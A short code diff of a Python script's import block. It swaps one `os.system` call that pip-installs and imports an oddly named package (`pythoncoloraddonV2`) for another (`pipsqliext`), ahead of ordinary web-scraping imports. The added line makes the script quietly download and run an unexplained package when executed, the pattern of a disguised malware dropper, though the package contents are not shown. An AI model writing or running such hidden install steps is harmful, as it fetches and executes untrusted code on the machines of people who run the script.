@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloraddonV2")
-import pythoncoloraddonV2
+os.system("pip install pipsqliext")
+import pipsqliext
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
